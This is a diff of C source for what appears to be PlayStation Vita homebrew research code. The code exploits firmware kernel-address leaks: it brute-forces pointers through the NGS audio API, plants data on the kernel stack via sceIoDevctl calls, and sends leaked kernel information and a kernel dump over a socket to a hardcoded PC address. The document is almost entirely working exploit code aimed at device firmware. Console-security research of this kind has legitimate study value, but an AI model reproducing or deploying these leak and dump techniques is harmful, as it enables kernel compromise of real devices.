@@ -19,6 +19,8 @@
 
 #include "debugScreen.h"
 
+#define PC_IP_FOR_SOCKET "192.168.0.40"
+
 
 static unsigned buttons[] = {
 	SCE_CTRL_SELECT,
@@ -86,6 +88,99 @@ uint32_t leaked_kstack_addr = 0;
 uint32_t leaked_sysmem_addr = 0;
 uint32_t sysmem_seg0_addr = 0;
 
+
+#define SCE_NGS_VOICE_DEFINITION_XOR   0x9e28dcce
+#define SCE_NGS_VOICE_DEFINITION_MAGIC 0x66647662
+#define SCE_NGS_VOICE_DEFINITION_FLAGS 0x00010001
+#define SCE_NGS_ERROR_INVALID_PARAM    0x804a0002
+
+typedef struct SceNgsSystemInitParams
+{
+    SceInt32 nMaxRacks;      /* Maximum number of Racks within the Stage */
+    SceInt32 nMaxVoices;     /* Maximum number of active voices */
+    SceInt32 nGranularity;   /* PCM sample granularity (NGS will process and output PCM sample packets of this size) */
+    SceInt32 nSampleRate;    /* Base sample rate */
+    SceInt32 nMaxModules;    /* Maximum number of module types which are available for the whole system. */
+} SceNgsSystemInitParams;
+
+typedef SceUInt32 SceNgsHSynSystem;
+
+typedef struct SceNgsRackDescription
+{
+    const struct SceNgsVoiceDefinition* pVoiceDefn;     /* Pointer to Voice Definition information */
+    SceInt32    nVoices;                                /* Maximum number of Voices within the Rack */
+    SceInt32    nChannelsPerVoice;                      /* Maximum number of audio channels for each voice (1=Mono, 2=Stereo) */
+    SceInt32    nMaxPatchesPerInput;                    /* Maximum number of Voices (processed from other Racks) which can be patched to each input */
+    SceInt32    nPatchesPerOutput;                      /* Maximum patches from each Voice output */
+    void*       pUserReleaseData;                       /* Pointer to user release data (when callback release method used) */
+} SceNgsRackDescription;
+
+uint32_t findkstackaddr(void) {
+	uint32_t ret = 0;
+	
+	SceAppUtilInitParam initParam;
+	SceAppUtilBootParam bootParam;
+	memset( &initParam, 0, sizeof(SceAppUtilInitParam) );
+	memset( &bootParam, 0, sizeof(SceAppUtilBootParam) );
+	ret = sceAppUtilInit( &initParam, &bootParam );
+	printf("sceAppUtilInit() returned 0x%08x\n", ret);
+	//ret = sceSysmoduleUnloadModule(SCE_SYSMODULE_NGS);
+	//printf("sceSysmoduleUnloadModule() returned 0x%08x\n", ret);
+	ret = sceSysmoduleLoadModule(SCE_SYSMODULE_NGS);
+	printf("sceSysmoduleLoadModule() returned 0x%08x\n", ret);
+	
+	SceNgsHSynSystem synSys;
+	SceNgsSystemInitParams initParams;
+	uint32_t paramsize;
+	
+	initParams.nMaxRacks    = 2;
+	initParams.nMaxVoices   = 2;
+	initParams.nGranularity = 512;
+	initParams.nSampleRate  = 48000;
+	initParams.nMaxModules  = 1;
+	
+	printf("sceNgsSystemGetRequiredMemorySize() returned 0x%x\n", sceNgsSystemGetRequiredMemorySize(&initParams, &paramsize));
+	static void *s_pSysMem;
+	s_pSysMem = memalign(256, paramsize);
+	printf("sceNgsSystemInit() returned 0x%x\n", sceNgsSystemInit(s_pSysMem, paramsize, &initParams, &synSys));
+	
+	SceNgsRackDescription rackDesc;
+	rackDesc.nChannelsPerVoice   = 1;
+	rackDesc.nVoices             = 1;
+	rackDesc.nMaxPatchesPerInput = 0;
+	rackDesc.nPatchesPerOutput   = 0;
+
+	uint32_t voiceDef[0x100];
+	memset(voiceDef, 0, 0x400);
+	voiceDef[0] = SCE_NGS_VOICE_DEFINITION_MAGIC;
+	voiceDef[1] = SCE_NGS_VOICE_DEFINITION_FLAGS;
+	voiceDef[2] = 0x40;
+	voiceDef[3] = 0x40;
+	sceIoDevctl("", 0, voiceDef, 0x3FF, NULL, 0);
+
+	// for recent FWs for exemple 3.60
+	for (uint32_t addr = 0x01800000; addr < 0x03000000; addr += 2) {
+		rackDesc.pVoiceDefn = (const struct SceNgsVoiceDefinition*) (addr ^ SCE_NGS_VOICE_DEFINITION_XOR);
+		ret = sceNgsRackGetRequiredMemorySize(synSys, &rackDesc, &paramsize);
+		if (ret == SCE_NGS_ERROR_INVALID_PARAM)
+			continue;
+		else
+			return addr & 0xFFFFF000; 
+	}
+	
+	// for old FWs for exemple 1.692
+	for (uint32_t addr = 0; addr < 0x03000000; addr += 2) {
+		rackDesc.pVoiceDefn = (struct SceNgsVoiceDefinition*)addr;
+		ret = sceNgsRackGetRequiredMemorySize(synSys, &rackDesc, &paramsize);
+		if (ret == SCE_NGS_ERROR_INVALID_PARAM)
+			continue;
+		else
+			return addr & 0xFFFFF000; 
+	}
+	
+	return 0xFFFF;
+}
+
 int leak_kernel_addresses() {
 	// 1) Call a function that writes sp to kernel stack
 	sceAppMgrLoadExec(NULL, NULL, NULL);
@@ -149,7 +244,7 @@ void init_netdbg()
 
 	server.sin_len = sizeof(server);
 	server.sin_family = SCE_NET_AF_INET;
-	sceNetInetPton(SCE_NET_AF_INET, "192.168.1.6", &server.sin_addr);
+	sceNetInetPton(SCE_NET_AF_INET, PC_IP_FOR_SOCKET, &server.sin_addr);
 	server.sin_port = sceNetHtons(9023);
 	memset(server.sin_zero, 0, sizeof(server.sin_zero));
 
@@ -186,11 +281,11 @@ int net_send_buffer(char *buffer, unsigned int size){
 	return sceNetSend(_dbgsock, buffer, size, 0);
 }
 
-
 char outbuf[0x400];
+char device_name[0x10];
+char command[0x10];
 
-int main(void)
-{
+int main(void) {
 	int ret = -1;
 	int key = 0;
 	int idx;
@@ -199,16 +294,17 @@ int main(void)
 	
 	psvDebugScreenInit();
 	printf("printf working! Press X to continue.\n");
-	do {
-	key = get_key();
-	} while (key != SCE_CTRL_CROSS);
+	do { key = get_key(); } while (key != SCE_CTRL_CROSS);
 	printf("ctrl working!\n");
 	
 	leak_kernel_addresses();
-	printf("leaked_sysmem_addr: %08X\n", leaked_sysmem_addr);
-	printf("leaked_kstack_addr: %08X\n", leaked_kstack_addr);
+	printf("leaked_sysmem_addr by SceMotionDev: %08X\n", leaked_sysmem_addr);
+	printf("leaked_kstack_addr by SceMotionDev: %08X\n", leaked_kstack_addr);
+	printf("leaked_kstack_addr by SceNgsUser: %08X\n", findkstackaddr());
+	printf("Press X to continue.\n");
+	do { key = get_key(); } while (key != SCE_CTRL_CROSS);
 	
-	sceKernelDelayThread(3 * 1000 * 1000);
+	sceKernelDelayThread(1 * 1000 * 1000);
 	
 	while (!done) {
 		menu();
@@ -235,39 +331,31 @@ int main(void)
 			menu();
 			printf("Test kstack leak\n");
 			
+			// int sceIoDevctl(const char *dev, unsigned int cmd, void *indata, int inlen, void *outdata, int outlen);
+			memset(outbuf, 0x66, 0x400); // write dummy data to recognize the buffer
 			
-			memset(outbuf, 0, 0x400);
 			ret = sceIoOpen("molecule0:", 0, 0); // sceIoOpen to populate kernel stack
+			//ret = sceAppMgrLoadExec(NULL, NULL, NULL);
 			printf("sceIoOpen ret: %08X\n", ret);
-			sceAppMgrLoadExec(NULL, NULL, NULL);
+			
+			ret = sceIoDevctl("", 0, outbuf, 0x3FF, NULL, 0); // this will push our buffer to the stack..
+			printf("sceIoDevctl ret: %08X\n", ret);
+			// now the buffer is on the stack, let's clear it locally..
+			memset(outbuf, 0x00, 0x400);
+			
+			//strcat(device_name, "sdstor0:");
+			//strcat(command, "gcd-lp-ign-gamero");
+			//strcat(command, "xmc-lp-ign-userext");
+			
 			ret = sceIoDevctl("sdstor0:", 5, "gcd-lp-ign-gamero", 0x14, &outbuf, 0x3FF);
 			printf("sceIoDevctl ret: %08X\n", ret);
-			/*uint32_t hleaked_sysmem_addr = ((uint32_t *)outbuf)[0x3D4/sizeof(uint32_t)];
-			uint32_t hsysmem_addr = leaked_sysmem_addr-0x5747; // 3.60 slide
-			uint32_t hleaked_kstack_addr = ((uint32_t *)outbuf)[0x3C4/sizeof(uint32_t)];
-			uint32_t hkstack_addr = leaked_kstack_addr-0xABC; // 3.60 slide
-			printf("leaked_sysmem_addr: %08X\n", hleaked_sysmem_addr);
-			printf("leaked_kstack_addr: %08X\n", hleaked_kstack_addr);*/
 			
-
-			int plant_thread(SceSize args, void *argp) {
-				sceIoOpen("molecule0:", 0, 0); // sceIoOpen to populate kernel stack
-				sceKernelDelayThread(1 * 1000 * 1000); // maybe unneeded
-				int retl = sceIoDevctl("sdstor0:", 5, "gcd-lp-ign-gamero", 0x14, &outbuf, 0x3FF);
-				printf("sceIoDevctl ret: %08X\n", retl);
-				return 0;
-			}
-			
-			uint32_t stack_size = 0x2000;
-			SceUID plant_thread_id = sceKernelCreateThread("pln", plant_thread, 0x10000100, stack_size, 0, 0, NULL);
-
-			ret = sceKernelStartThread(plant_thread_id, 0, NULL); // it should hang
-			sceKernelWaitThreadEnd(plant_thread_id, 0, 0);
-			printf("start plant rop thread 0x%x\n", ret);
 			
 			sceKernelDelayThread(3 * 1000 * 1000);
-			for (int e = 0; e < 0x400; e+=4)
+			for (uint32_t e=0; e < 0x400; e+=sizeof(uint32_t)) {
 				printf("%08X\n", ((uint32_t *)outbuf)[e/sizeof(uint32_t)]);
+				sceKernelDelayThread(100 * 1000);
+			}
 			sceKernelDelayThread(3 * 1000 * 1000);
 			
 			init_netdbg();
@@ -325,7 +413,7 @@ int main(void)
 			sysmem_seg0_addr = (sysmem_seg0_addr - 0x24750) & 0xFFFFF000;
 			printf("sysmem_seg0_addr: %08X\n", sysmem_seg0_addr);
 			
-			uint32_t delta_sub = 0x64000;
+			uint32_t delta_sub = 0;
 			
 			kdump_info kinfo;
 			memset((void *)&kinfo, 0, sizeof(kinfo));
@@ -335,6 +423,7 @@ int main(void)
 			kinfo.leaked_kstack_addr = leaked_kstack_addr;
 			memcpy(kinfo.leaked_info, info, sizeof(info));
 			net_send_buffer((char *)&kinfo, sizeof(kinfo));
+			printf("kernel dump infos buffer sent");
 			
 			printf("Start dumping kernel...\n");
 			// Dump kernel
